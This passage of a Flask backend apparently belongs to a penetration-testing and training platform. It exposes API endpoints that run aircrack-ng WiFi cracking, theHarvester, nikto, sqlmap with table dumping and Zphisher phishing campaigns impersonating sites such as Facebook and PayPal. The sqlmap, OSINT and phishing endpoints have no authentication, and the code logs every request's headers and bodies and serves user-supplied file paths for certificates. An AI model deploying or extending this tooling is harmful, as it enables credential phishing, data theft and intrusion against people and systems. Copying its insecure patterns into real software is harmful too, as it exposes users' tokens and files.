            """SELECT j.job_id, j.status, j.created_at, j.completed_at, \
                      t.name as tool_name, tg.target_value
               FROM jobs j
               JOIN tools t ON j.tool_id = t.tool_id
               LEFT JOIN targets tg ON j.target_id = tg.target_id
               WHERE j.user_id = %s
               ORDER BY j.created_at DESC
               LIMIT %s OFFSET %s""",
            (current_user, per_page, (page - 1) * per_page)
        )

        total_result = execute_query(
            "SELECT COUNT(*) as count FROM jobs WHERE user_id = %s",
            (current_user,),
            fetch_one=True
        )
        total = total_result['count'] if total_result and 'count' in total_result else 0

        return jsonify({
            "jobs": jobs,
            "pagination": {
                "page": page,
                "per_page": per_page,
                "total": total
            }
        }), 200
    except Exception as e:
        app.logger.error(f"Get jobs error: {e}")
        return jsonify({"error": "Failed to get jobs"}), 500

# Report Endpoint

@app.route('/api/jobs/<int:job_id>', methods=['GET'])
@jwt_required()
def get_job_details(job_id):
    try:
        current_user = get_jwt_identity()
        claims = get_jwt()
        # Allow if user owns job or is admin
        job = execute_query(
            "SELECT j.*, u.username, t.name as tool_name, tg.target_value FROM jobs j "
            "JOIN users u ON j.user_id = u.user_id "
            "JOIN tools t ON j.tool_id = t.tool_id "
            "LEFT JOIN targets tg ON j.target_id = tg.target_id "
            "WHERE j.job_id = %s",
            (job_id,),
            fetch_one=True
        )
        if not job:
            return jsonify({"error": "Job not found"}), 404
        if not (claims['role'] == 'admin' or job['user_id'] == current_user):
            return jsonify({"error": "Unauthorized"}), 403
        return jsonify({"job": job}), 200
    except Exception as e:
        app.logger.error(f"Get job details error: {e}")
        return jsonify({"error": "Failed to get job details"}), 500

@app.route('/api/jobs/<int:job_id>/report', methods=['GET'])
@jwt_required()
def get_job_report(job_id):
    try:
        current_user = get_jwt_identity()
        claims = get_jwt()
        
        # Verify job ownership or admin access
        job = execute_query(
            "SELECT * FROM jobs WHERE job_id = %s AND (user_id = %s OR %s = 'admin')",
            (job_id, current_user, claims['role']),
            fetch_one=True
        )
        if not job:
            return jsonify({"error": "Job not found or unauthorized"}), 404
            
        # Generate report
        report_path = generate_report(job_id)
        if not report_path:
            return jsonify({"error": "Report generation failed"}), 500
            
        log_activity(current_user, 'download_report', 'job', job_id)
        return send_file(
            report_path,
            as_attachment=True,
            download_name=f"report_{job_id}.pdf",
            mimetype='application/pdf'
        )
        
    except Exception as e:
        app.logger.error(f"Report generation error: {e}")
        return jsonify({"error": "Failed to generate report"}), 500

# Health Check Endpoint
@app.route('/api/health', methods=['GET'])
def health_check():
    try:
        # Check database connection
        execute_query("SELECT 1", fetch_one=True)
        
        # Check external services
        services = {
            'database': True,
            'virustotal': bool(app.config['VIRUSTOTAL_API_KEY']),
            'alienvault_otx': bool(app.config['ALIENVAULT_OTX_KEY'])
        }
        
        return jsonify({
            "status": "healthy",
            "services": services,
            "timestamp": datetime.now().isoformat()
        }), 200
        
    except Exception as e:
        app.logger.error(f"Health check error: {e}")
        return jsonify({
            "status": "unhealthy",
            "error": str(e),
            "timestamp": datetime.now().isoformat()
        }), 500

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(422)
def handle_unprocessable_entity(error):
    app.logger.error(f"422 Error: {error}, Body: {request.get_data()}, Headers: {dict(request.headers)}")
    return jsonify({
        "error": "Unprocessable Entity",
        "description": getattr(error, 'description', str(error)),
        "message": "Check your request data and authentication headers."
    }), 422

@app.errorhandler(400)
def handle_bad_request(error):
    app.logger.error(f"400 Bad Request: {error}, Body: {request.get_data()}")
    return jsonify({
        "error": "Bad Request",
        "description": getattr(error, 'description', str(error)),
        "message": "Malformed request. Ensure Content-Type is application/json and payload is valid."
    }), 400

@app.errorhandler(500)
def internal_error(error):
    app.logger.error(f"Server error: {error}")
    return jsonify({"error": "Internal server error"}), 500

@app.errorhandler(429)
def ratelimit_handler(error):
    return jsonify({
        "error": "Rate limit exceeded",
        "description": f"Too many requests. Limit: {error.description}"
    }), 429

@app.before_request
def log_request_info():
    if request.content_type and request.content_type.startswith('multipart/form-data'):
        app.logger.info(f"Headers: {dict(request.headers)}")
        app.logger.info("Body: [multipart/form-data omitted]")
    else:
        app.logger.info(f"Headers: {dict(request.headers)}")
        app.logger.info(f"Body: {request.get_data()}")

# Add JWT error callbacks for debugging
@jwt.invalid_token_loader
def invalid_token_callback(reason):
    app.logger.error(f"Invalid JWT: {reason}")
    return jsonify({"error": "Invalid JWT", "reason": reason}), 422

@jwt.unauthorized_loader
def unauthorized_callback(reason):
    app.logger.error(f"Missing JWT: {reason}")
    return jsonify({"error": "Missing JWT", "reason": reason}), 401

@jwt.expired_token_loader
def expired_token_callback(jwt_header, jwt_payload):
    app.logger.error("Expired JWT")
    return jsonify({"error": "Expired JWT"}), 401

def serialize_datetimes(obj):
    """Recursively convert datetime objects in a dict/list to strings."""
    import datetime
    if isinstance(obj, dict):
        return {k: serialize_datetimes(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [serialize_datetimes(i) for i in obj]
    elif isinstance(obj, datetime.datetime):
        return obj.isoformat()
    elif isinstance(obj, datetime.date):
        return obj.isoformat()
    else:
        return obj

@app.route('/api/auth/refresh', methods=['POST', 'OPTIONS'])
@jwt_required(refresh=True)
def refresh():
    identity = get_jwt_identity()
    access_token = create_access_token(identity=identity)
    return jsonify(access_token=access_token), 200

@app.route('/api/tools/wifi/scan', methods=['POST'])
@jwt_required()
def wifi_scan():
    """
    Scan for nearby WiFi networks and return SSID, signal strength, and security type.
    Admin only (for security reasons). Works on both Windows and Linux.
    """
    import subprocess
    import re
    try:
        claims = get_jwt()
        if claims.get('role') != 'admin':
            return jsonify({"error": "Unauthorized"}), 403
        system = platform.system().lower()
        if system == 'windows':
            # Use netsh on Windows
            try:
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'networks', 'mode=Bssid'],
                    capture_output=True, text=True, timeout=30
                )
                if result.returncode != 0:
                    raise Exception(result.stderr)
                output = result.stdout
                networks = []
                ssid = None
                signal = None
                security = None
                for line in output.splitlines():
                    line = line.strip()
                    if line.startswith('SSID '):
                        ssid = line.split(':', 1)[1].strip()
                    elif line.startswith('Signal'):
                        signal = line.split(':', 1)[1].strip()
                    elif line.startswith('Authentication'):
                        security = line.split(':', 1)[1].strip()
                    if ssid and signal and security:
                        networks.append({
                            'ssid': ssid,
                            'signal': signal,
                            'security': security
                        })
                        ssid = signal = security = None
                return jsonify({"networks": networks}), 200
            except Exception as win_err:
                return jsonify({
                    "error": "WiFi scan failed on Windows.",
                    "details": str(win_err)
                }), 500
        else:
            # Try nmcli first (modern systems)
            try:
                result = subprocess.run([
                    'nmcli', '-t', '-f', 'SSID,SIGNAL,SECURITY', 'device', 'wifi', 'list'
                ], capture_output=True, text=True, timeout=30)
                if result.returncode != 0:
                    raise Exception(result.stderr)
                lines = result.stdout.strip().split('\n')
                networks = []
                for line in lines:
                    # nmcli output: SSID:SIGNAL:SECURITY
                    parts = line.split(':')
                    if len(parts) >= 3:
                        ssid = parts[0]
                        signal = parts[1]
                        security = ':'.join(parts[2:])
                        networks.append({
                            'ssid': ssid,
                            'signal': signal,
                            'security': security
                        })
                return jsonify({"networks": networks}), 200
            except Exception as nmcli_err:
                # Fallback to iwlist if nmcli fails
                try:
                    result = subprocess.run([
                        'iwlist', 'scan'
                    ], capture_output=True, text=True, timeout=30)
                    if result.returncode != 0:
                        raise Exception(result.stderr)
                    # Parse iwlist output
                    networks = []
                    cells = result.stdout.split('Cell ')
                    for cell in cells[1:]:
                        ssid_match = re.search(r'ESSID:"(.*?)"', cell)
                        signal_match = re.search(r'Signal level=([\-\d]+)', cell)
                        enc_match = re.search(r'Encryption key:(on|off)', cell)
                        wpa_match = re.search(r'IE: WPA Version (\d+)', cell)
                        wpa2_match = re.search(r'IE: IEEE 802.11i/WPA2 Version (\d+)', cell)
                        ssid = ssid_match.group(1) if ssid_match else ''
                        signal = signal_match.group(1) if signal_match else ''
                        if enc_match and enc_match.group(1) == 'off':
                            security = 'Open'
                        elif wpa2_match:
                            security = 'WPA2'
                        elif wpa_match:
                            security = 'WPA'
                        elif enc_match and enc_match.group(1) == 'on':
                            security = 'WEP'
                        else:
                            security = 'Unknown'
                        networks.append({
                            'ssid': ssid,
                            'signal': signal,
                            'security': security
                        })
                    return jsonify({"networks": networks}), 200
                except Exception as iwlist_err:
                    return jsonify({
                        "error": "WiFi scan failed. Ensure you have the required permissions and tools installed.",
                        "nmcli_error": str(nmcli_err),
                        "iwlist_error": str(iwlist_err)
                    }), 500
    except Exception as e:
        app.logger.error(f"WiFi scan error: {e}")
        return jsonify({"error": "WiFi scan failed", "details": str(e)}), 500

@app.route('/api/tools/wifi/crack', methods=['POST'])
@jwt_required()
def wifi_crack():
    """
    Attempt to crack a WiFi handshake file using aircrack-ng and a wordlist.
    Admin only. Expects multipart/form-data with 'handshake' and 'wordlist' files.
    """
    import tempfile
    import os
    import subprocess
    try:
        claims = get_jwt()
        if claims.get('role') != 'admin':
            return jsonify({"error": "Unauthorized"}), 403
        if 'handshake' not in request.files or 'wordlist' not in request.files:
            return jsonify({"error": "Missing handshake or wordlist file"}), 400
        handshake_file = request.files['handshake']
        wordlist_file = request.files['wordlist']
        # Save files to temp
        with tempfile.TemporaryDirectory() as tmpdir:
            handshake_path = os.path.join(tmpdir, 'handshake.cap')
            wordlist_path = os.path.join(tmpdir, 'wordlist.txt')
            handshake_file.save(handshake_path)
            wordlist_file.save(wordlist_path)
            # Run aircrack-ng
            aircrack_path = app.config.get('AIRCRACK_PATH', '/usr/bin/aircrack-ng')
            cmd = [
                aircrack_path,
                '-w', wordlist_path,
                '-b', request.form.get('bssid', ''),  # Optional: BSSID
                handshake_path
            ]
            # Remove empty BSSID if not provided
            if not request.form.get('bssid'):
                cmd = [c for c in cmd if c != '-b' and c != '']
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            except Exception as e:
                return jsonify({"error": "aircrack-ng failed to run", "details": str(e)}), 500
            # Parse output for key
            import re
            key_match = re.search(r'KEY FOUND! \[ (.+) \]', result.stdout)
            if key_match:
                password = key_match.group(1)
                return jsonify({"success": True, "password": password, "output": result.stdout}), 200
            else:
                return jsonify({"success": False, "password": None, "output": result.stdout, "error": "Password not found"}), 200
    except Exception as e:
        app.logger.error(f"WiFi crack error: {e}")
        return jsonify({"error": "WiFi crack failed", "details": str(e)}), 500

# --- theHarvester OSINT Endpoint ---
@app.route('/api/tools/osint/harvester', methods=['POST'])
def run_harvester():
    data = request.get_json()
    domain = data.get('target')
    if not domain:
        return jsonify({'error': 'Missing target'}), 400
    import tempfile
    import os
    import json
    with tempfile.TemporaryDirectory() as tmpdir:
        output_path = os.path.join(tmpdir, 'harvester_output')
        cmd = [
            'theHarvester',
            '-d', domain,
            '-b', 'all',
            '-f', output_path,
            '-s', '0',
            '-l', '100',
            '-v'
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            json_path = output_path + '.json'
            if not os.path.exists(json_path):
                return jsonify({'error': 'theHarvester did not produce output'}), 500
            with open(json_path, 'r') as f:
                harvester_data = json.load(f)
            return jsonify({
                'emails': harvester_data.get('emails', []),
                'hosts': harvester_data.get('hosts', [])
            })
        except Exception as e:
            return jsonify({'error': str(e)}), 500

@app.route('/api/tools/osint/nikto', methods=['POST'])
def run_nikto():
    data = request.get_json()
    target = data.get('target')
    if not target:
        return jsonify({'error': 'Missing target'}), 400

    import subprocess
    import tempfile
    import os

    with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as tmpfile:
        output_path = tmpfile.name

    cmd = [
        'nikto',
        '-h', target,
        '-o', output_path,
        '-Format', 'txt'
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        with open(output_path, 'r') as f:
            nikto_output = f.read()
        os.remove(output_path)
        return jsonify({'output': nikto_output})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/tools/osint/sqlmap', methods=['POST'])
def run_sqlmap():
    data = request.get_json()
    url = data.get('url')
    if not url:
        return jsonify({'error': 'Missing url'}), 400

    import subprocess
    import tempfile
    import os

    with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as tmpfile:
        output_path = tmpfile.name

    cmd = [
        'sqlmap',
        '-u', url,
        '--batch',
        '--output-dir', os.path.dirname(output_path),
    ]
    # Add risk and level if provided
    risk = data.get('risk')
    level = data.get('level')
    if risk:
        cmd += ['--risk', str(risk)]
    if level:
        cmd += ['--level', str(level)]
    # Advanced options
    if data.get('dbs'):
        cmd.append('--dbs')
    if data.get('tables'):
        cmd.append('--tables')
    if data.get('dump'):
        cmd.append('--dump')
    if data.get('db'):
        cmd += ['-D', data['db']]
    if data.get('table'):
        cmd += ['-T', data['table']]
    cmd.append('--flush-session')
    cmd.append('--answers=follow=Y')
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        output = result.stdout + '\n' + result.stderr
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# --- Education Sector Endpoints ---
@app.route('/api/education/courses', methods=['GET'])
def list_courses():
    try:
        courses = execute_query(
            "SELECT course_id, title, description, video_url, created_at FROM courses ORDER BY created_at DESC"
        )
        return jsonify({"courses": courses}), 200
    except Exception as e:
        app.logger.error(f"List courses error: {e}")
        return jsonify({"error": "Failed to fetch courses"}), 500

@app.route('/api/education/courses/<int:course_id>', methods=['GET'])
def get_course(course_id):
    try:
        course = execute_query(
            "SELECT course_id, title, description, video_url, created_at FROM courses WHERE course_id = %s",
            (course_id,),
            fetch_one=True
        )
        if not course:
            return jsonify({"error": "Course not found"}), 404
        # Get quizzes for this course
        quizzes = execute_query(
            "SELECT quiz_id, title, description FROM quizzes WHERE course_id = %s",
            (course_id,)
        )
        course['quizzes'] = quizzes
        return jsonify({"course": course}), 200
    except Exception as e:
        app.logger.error(f"Get course error: {e}")
        return jsonify({"error": "Failed to fetch course details"}), 500

@app.route('/api/education/quizzes/<int:quiz_id>', methods=['GET'])
def get_quiz(quiz_id):
    try:
        quiz = execute_query(
            "SELECT quiz_id, course_id, title, description FROM quizzes WHERE quiz_id = %s",
            (quiz_id,),
            fetch_one=True
        )
        if not quiz:
            return jsonify({"error": "Quiz not found"}), 404
        # Get questions and options
        questions = execute_query(
            "SELECT question_id, question_text, question_type FROM questions WHERE quiz_id = %s",
            (quiz_id,)
        )
        for q in questions:
            options = execute_query(
                "SELECT option_id, option_text FROM options WHERE question_id = %s",
                (q['question_id'],)
            ) if q['question_type'] == 'multiple_choice' else []
            q['options'] = options
        quiz['questions'] = questions
        return jsonify({"quiz": quiz}), 200
    except Exception as e:
        app.logger.error(f"Get quiz error: {e}")
        return jsonify({"error": "Failed to fetch quiz"}), 500

@app.route('/api/education/quizzes/<int:quiz_id>/submit', methods=['POST'])
@jwt_required()
def submit_quiz(quiz_id):
    try:
        user_id = get_jwt_identity()
        data = request.get_json() or {}
        answers = data.get('answers', [])  # [{question_id, selected_option_id, answer_text}]
        if not answers:
            return jsonify({"error": "No answers submitted"}), 400
        # Insert submission
        submission_id = execute_query(
            "INSERT INTO user_quiz_submissions (user_id, quiz_id, score) VALUES (%s, %s, %s)",
            (user_id, quiz_id, 0)
        )
        score = 0
        for ans in answers:
            question_id = ans.get('question_id')
            selected_option_id = ans.get('selected_option_id')
            answer_text = ans.get('answer_text')
            # Check if correct (for multiple_choice)
            is_correct = False
            if selected_option_id:
                opt = execute_query(
                    "SELECT is_correct FROM options WHERE option_id = %s",
                    (selected_option_id,),
                    fetch_one=True
                )
                is_correct = opt and opt['is_correct']
            # For now, only auto-score multiple_choice
            if is_correct:
                score += 1
            execute_query(
                "INSERT INTO user_answers (submission_id, question_id, selected_option_id, answer_text) VALUES (%s, %s, %s, %s)",
                (submission_id, question_id, selected_option_id, answer_text)
            )
        # Update score
        execute_query(
            "UPDATE user_quiz_submissions SET score = %s WHERE submission_id = %s",
            (score, submission_id)
        )
        return jsonify({"message": "Quiz submitted", "score": score}), 200
    except Exception as e:
        app.logger.error(f"Submit quiz error: {e}")
        return jsonify({"error": "Failed to submit quiz"}), 500

@app.route('/api/education/courses/<int:course_id>/progress', methods=['GET'])
@jwt_required()
def get_course_progress(course_id):
    try:
        user_id = get_jwt_identity()
        progress = execute_query(
            "SELECT * FROM user_course_progress WHERE user_id = %s AND course_id = %s",
            (user_id, course_id),
            fetch_one=True
        )
        if not progress:
            return jsonify({"progress": {"completed": False, "progress": 0}}), 200
        return jsonify({"progress": progress}), 200
    except Exception as e:
        app.logger.error(f"Get course progress error: {e}")
        return jsonify({"error": "Failed to fetch progress"}), 500

@app.route('/api/education/courses/<int:course_id>/progress', methods=['POST'])
@jwt_required()
def update_course_progress(course_id):
    try:
        user_id = get_jwt_identity()
        data = request.get_json() or {}
        progress = data.get('progress', 0)
        completed = data.get('completed', False)
        certificate_url = data.get('certificate_url')
        completed_at = datetime.now() if completed else None
        # Upsert logic
        existing = execute_query(
            "SELECT * FROM user_course_progress WHERE user_id = %s AND course_id = %s",
            (user_id, course_id),
            fetch_one=True
        )
        if existing:
            execute_query(
                "UPDATE user_course_progress SET progress = %s, completed = %s, certificate_url = %s, completed_at = %s WHERE user_id = %s AND course_id = %s",
                (progress, completed, certificate_url, completed_at, user_id, course_id)
            )
        else:
            execute_query(
                "INSERT INTO user_course_progress (user_id, course_id, progress, completed, certificate_url, completed_at) VALUES (%s, %s, %s, %s, %s, %s)",
                (user_id, course_id, progress, completed, certificate_url, completed_at)
            )
        return jsonify({"message": "Progress updated"}), 200
    except Exception as e:
        app.logger.error(f"Update course progress error: {e}")
        return jsonify({"error": "Failed to update progress"}), 500

# --- User Document Upload & Status ---
@app.route('/api/education/documents/upload', methods=['POST'])
@jwt_required()
def upload_document():
    try:
        user_id = get_jwt_identity()
        if 'file' not in request.files:
            return jsonify({"error": "No file uploaded"}), 400
        file = request.files['file']
        document_type = request.form.get('document_type')
        if not document_type:
            return jsonify({"error": "Document type required"}), 400
        filename = secure_filename(f"doc_{user_id}_{document_type}_{file.filename}")
        upload_folder = app.config.get('UPLOAD_FOLDER', '/tmp/uploads')
        file_path = os.path.join(upload_folder, filename)
        file.save(file_path)
        file_url = f"/uploads/{filename}"
        execute_query(
            "INSERT INTO user_documents (user_id, document_type, file_url, status) VALUES (%s, %s, %s, 'pending')",
            (user_id, document_type, file_url)
        )
        return jsonify({"message": "Document uploaded", "file_url": file_url}), 200
    except Exception as e:
        app.logger.error(f"Upload document error: {e}")
        return jsonify({"error": "Failed to upload document"}), 500

@app.route('/api/education/documents/status', methods=['GET'])
@jwt_required()
def document_status():
    try:
        user_id = get_jwt_identity()
        docs = execute_query(
            "SELECT document_id, document_type, file_url, status, reviewed_by, reviewed_at, uploaded_at FROM user_documents WHERE user_id = %s ORDER BY uploaded_at DESC",
            (user_id,)
        )
        return jsonify({"documents": docs}), 200
    except Exception as e:
        app.logger.error(f"Document status error: {e}")
        return jsonify({"error": "Failed to fetch document status"}), 500

# --- Certificate Download ---
@app.route('/api/education/certificate/<int:course_id>', methods=['GET'])
@jwt_required()
def download_certificate(course_id):
    try:
        user_id = get_jwt_identity()
        progress = execute_query(
            "SELECT certificate_url FROM user_course_progress WHERE user_id = %s AND course_id = %s AND completed = TRUE",
            (user_id, course_id),
            fetch_one=True
        )
        if not progress or not progress.get('certificate_url'):
            return jsonify({"error": "Certificate not available"}), 404
        cert_path = progress['certificate_url']
        # Assume cert_path is a file path; adjust if using URLs
        return send_file(cert_path, as_attachment=True)
    except Exception as e:
        app.logger.error(f"Download certificate error: {e}")
        return jsonify({"error": "Failed to download certificate"}), 500

# --- Admin Endpoints ---
def admin_required():
    claims = get_jwt()
    if claims.get('role') != 'admin':
        return False
    return True

@app.route('/api/admin/education/courses', methods=['POST'])
@jwt_required()
def admin_create_course():
    if not admin_required():
        return jsonify({"error": "Unauthorized"}), 403
    data = request.get_json() or {}
    title = data.get('title')
    description = data.get('description')
    video_url = data.get('video_url')
    if not title:
        return jsonify({"error": "Title required"}), 400
    course_id = execute_query(
        "INSERT INTO courses (title, description, video_url) VALUES (%s, %s, %s)",
        (title, description, video_url)
    )
    return jsonify({"message": "Course created", "course_id": course_id}), 201

@app.route('/api/admin/education/courses/<int:course_id>', methods=['PUT'])
@jwt_required()
def admin_update_course(course_id):
    if not admin_required():
        return jsonify({"error": "Unauthorized"}), 403
    data = request.get_json() or {}
    title = data.get('title')
    description = data.get('description')
    video_url = data.get('video_url')
    execute_query(
        "UPDATE courses SET title = %s, description = %s, video_url = %s WHERE course_id = %s",
        (title, description, video_url, course_id)
    )
    return jsonify({"message": "Course updated"}), 200

@app.route('/api/admin/education/courses/<int:course_id>', methods=['DELETE'])
@jwt_required()
def admin_delete_course(course_id):
    if not admin_required():
        return jsonify({"error": "Unauthorized"}), 403
    execute_query(
        "DELETE FROM courses WHERE course_id = %s",
        (course_id,)
    )
    return jsonify({"message": "Course deleted"}), 200

@app.route('/api/admin/education/quizzes', methods=['POST'])
@jwt_required()
def admin_create_quiz():
    if not admin_required():
        return jsonify({"error": "Unauthorized"}), 403
    data = request.get_json() or {}
    course_id = data.get('course_id')
    title = data.get('title')
    description = data.get('description')
    if not course_id or not title:
        return jsonify({"error": "Course ID and title required"}), 400
    quiz_id = execute_query(
        "INSERT INTO quizzes (course_id, title, description) VALUES (%s, %s, %s)",
        (course_id, title, description)
    )
    return jsonify({"message": "Quiz created", "quiz_id": quiz_id}), 201

@app.route('/api/admin/education/questions', methods=['POST'])
@jwt_required()
def admin_create_question():
    if not admin_required():
        return jsonify({"error": "Unauthorized"}), 403
    data = request.get_json() or {}
    quiz_id = data.get('quiz_id')
    question_text = data.get('question_text')
    question_type = data.get('question_type')
    if not quiz_id or not question_text or not question_type:
        return jsonify({"error": "Quiz ID, question text, and type required"}), 400
    question_id = execute_query(
        "INSERT INTO questions (quiz_id, question_text, question_type) VALUES (%s, %s, %s)",
        (quiz_id, question_text, question_type)
    )
    return jsonify({"message": "Question created", "question_id": question_id}), 201

@app.route('/api/admin/education/options', methods=['POST'])
@jwt_required()
def admin_create_option():
    if not admin_required():
        return jsonify({"error": "Unauthorized"}), 403
    data = request.get_json() or {}
    question_id = data.get('question_id')
    option_text = data.get('option_text')
    is_correct = data.get('is_correct', False)
    if not question_id or not option_text:
        return jsonify({"error": "Question ID and option text required"}), 400
    option_id = execute_query(
        "INSERT INTO options (question_id, option_text, is_correct) VALUES (%s, %s, %s)",
        (question_id, option_text, is_correct)
    )
    return jsonify({"message": "Option created", "option_id": option_id}), 201

@app.route('/api/admin/education/documents', methods=['GET'])
@jwt_required()
def admin_list_documents():
    if not admin_required():
        return jsonify({"error": "Unauthorized"}), 403
    docs = execute_query(
        "SELECT * FROM user_documents ORDER BY uploaded_at DESC"
    )
    return jsonify({"documents": docs}), 200

@app.route('/api/admin/education/documents/<int:document_id>/review', methods=['POST'])
@jwt_required()
def admin_review_document(document_id):
    if not admin_required():
        return jsonify({"error": "Unauthorized"}), 403
    data = request.get_json() or {}
    status = data.get('status')
    if status not in ['approved', 'rejected']:
        return jsonify({"error": "Invalid status"}), 400
    reviewed_by = get_jwt_identity()
    reviewed_at = datetime.now()
    execute_query(
        "UPDATE user_documents SET status = %s, reviewed_by = %s, reviewed_at = %s WHERE document_id = %s",
        (status, reviewed_by, reviewed_at, document_id)
    )
    return jsonify({"message": f"Document {status}"}), 200

@app.route('/api/admin/education/certificate/generate', methods=['POST'])
@jwt_required()
def admin_generate_certificate():
    if not admin_required():
        return jsonify({"error": "Unauthorized"}), 403
    data = request.get_json() or {}
    user_id = data.get('user_id')
    course_id = data.get('course_id')
    certificate_url = data.get('certificate_url')
    if not user_id or not course_id or not certificate_url:
        return jsonify({"error": "user_id, course_id, and certificate_url required"}), 400
    completed_at = datetime.now()
    # Update user_course_progress with certificate
    execute_query(
        "UPDATE user_course_progress SET completed = TRUE, certificate_url = %s, completed_at = %s WHERE user_id = %s AND course_id = %s",
        (certificate_url, completed_at, user_id, course_id)
    )
    return jsonify({"message": "Certificate generated and assigned"}), 200

@app.route('/api/zphisher/start', methods=['POST'])
def api_zphisher_start():
    data = request.get_json() or {}
    template = data.get('template', 'Facebook')
    tunnel_type = data.get('tunnel', 'ngrok')
    try:
        session_id = start_zphisher(template, tunnel_type)
        return jsonify({'session_id': session_id}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/zphisher/status', methods=['GET'])
def api_zphisher_status():
    session_id = request.args.get('session_id')
    if not session_id:
        return jsonify({'error': 'session_id required'}), 400
    status = get_status(session_id)
    if not status:
        return jsonify({'error': 'Session not found'}), 404
    return jsonify(status), 200

@app.route('/api/zphisher/stop', methods=['POST'])
def api_zphisher_stop():
    data = request.get_json() or {}
    session_id = data.get('session_id')
    if not session_id:
        return jsonify({'error': 'session_id required'}), 400
    stopped = stop_session(session_id)
    if not stopped:
        return jsonify({'error': 'Session not found'}), 404
    return jsonify({'message': 'Session stopped'}), 200

@app.route('/api/zphisher/templates', methods=['GET'])
def api_zphisher_templates():
    try:
        templates = fetch_zphisher_templates()
        return jsonify({'templates': templates}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/zphisher/diagnostics', methods=['GET'])
def api_zphisher_diagnostics():
    try:
        return jsonify({
            'ngrok_available': check_ngrok_available(),
            'ssh_available': check_ssh_available(),
            'os': 'windows' if is_windows() else 'linux'
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/zphisher/history', methods=['GET'])
def api_zphisher_history():
    return jsonify({'sessions': get_history()}), 200

@app.route('/api/zphisher/history/<session_id>', methods=['GET'])
def api_zphisher_history_detail(session_id):
    detail = get_history_detail(session_id)
    if not detail:
        return jsonify({'error': 'Session not found'}), 404
    return jsonify(detail), 200

@app.route('/api/zphisher/export/<session_id>', methods=['GET'])
def api_zphisher_export(session_id):
    log = export_session_log(session_id)
    if not log:
        return jsonify({'error': 'Session not found'}), 404
    from flask import Response
    return Response(log, mimetype='text/plain', headers={
        'Content-Disposition': f'attachment; filename=zphisher_session_{session_id}.log'
    })

socketio = SocketIO(app, cors_allowed_origins="*")

# Patch zphisher_service.py to emit output lines
import zphisher_service
zphisher_service.socketio = socketio

def fetch_zphisher_templates():
    import subprocess
    import re
    try:
        proc = subprocess.Popen(['bash', ZPHISHER_PATH], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        output, _ = proc.communicate(timeout=20)
        templates = []
        for line in output.splitlines():
            match = re.match(r"\[\s*(\d+)\s*\]\s+(.+)", line)
            if match:
                templates.append(match.group(2).strip())
            if "Select An Attack" in line or "Select an option" in line or "Enter your choice" in line:
                break
        if not templates:
            print("Zphisher template parse failed. Raw output:")
            print(output)
            # Fallback to hardcoded list
            return [
                "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Twitter", "LinkedIn",
                "GitHub", "Wordpress", "Yahoo", "Twitch", "Pinterest", "Reddit", "Steam", "VK", "Yandex",
                "DevianArt", "Protonmail", "Spotify", "Adobe", "Shopify", "Messenger", "Dropbox", "eBay",
                "Badoo", "Origin", "CryptoCoin", "XBOX", "MediaFire", "GitLab", "PornHub", "Custom"
            ]
        return templates
    except Exception as e:
        print(f"Zphisher template fetch error: {e}")
        # Fallback to hardcoded list
        return [
            "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Twitter", "LinkedIn",
            "GitHub", "Wordpress", "Yahoo", "Twitch", "Pinterest", "Reddit", "Steam", "VK", "Yandex",
            "DevianArt", "Protonmail", "Spotify", "Adobe", "Shopify", "Messenger", "Dropbox", "eBay",
            "Badoo", "Origin", "CryptoCoin", "XBOX", "MediaFire", "GitLab", "PornHub", "Custom"
        ]

if __name__ == '__main__':
    # Setup logging
    socketio.run(app, host='0.0.0.0', port=5000)